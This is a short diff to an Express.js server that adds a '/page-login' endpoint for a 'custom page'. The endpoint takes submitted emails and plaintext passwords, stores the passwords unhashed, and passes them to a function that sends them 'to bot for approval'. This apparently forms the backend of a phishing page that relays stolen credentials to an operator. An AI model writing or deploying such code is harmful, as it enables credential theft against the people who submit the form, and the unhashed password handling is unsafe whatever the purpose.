@@ -29,6 +29,25 @@ app.get("/", (req, res) => {
 });
 
 // -----------------
+// Backend for your custom page
+// -----------------
+app.post("/page-login", (req, res) => {
+  const email = (req.body.email || "").trim().toLowerCase();
+  const password = req.body.password;
+
+  if (!email || !password) return res.status(400).json({ success: false, message: "Email and password required" });
+
+  // Add to pending users
+  pendingUsers[email] = { password, status: "pending" };
+  console.log(`📥 Page Login Received: ${email}`);
+
+  // Send to bot for approval
+  sendApprovalRequest(email, password);
+
+  res.json({ success: true });
+});
+
+// -----------------
 // Email/Password Login
 // -----------------
 app.post("/login", (req, res) => {
